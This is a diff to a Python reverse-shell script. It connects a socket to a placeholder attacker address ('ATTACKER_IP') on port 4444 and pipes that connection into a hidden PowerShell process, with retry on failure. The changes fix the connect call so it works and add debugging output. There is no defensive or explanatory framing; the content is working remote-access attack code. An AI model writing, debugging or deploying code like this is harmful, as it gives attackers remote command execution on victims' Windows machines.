@@ -3,6 +3,7 @@ import threading
 import subprocess
 import time
 
+ATTACKER_IP = "x"
 def powershell_handler(connection):
     powershell_instance = subprocess.Popen(
         ["powershell.exe", "-NoLogo", "-NoProfile"],
@@ -49,9 +50,12 @@ def powershell_handler(connection):
 def establish_connection():
     try:
         caller = socket.socket()
-        caller.connect("IP", 4444)
+        print('connected!!')
+        caller.connect((ATTACKER_IP, 4444))
+        print('connected!')
         powershell_handler(caller)
-    except:
+    except Exception as e :
+        print(e)
         time.sleep(5)
 
 
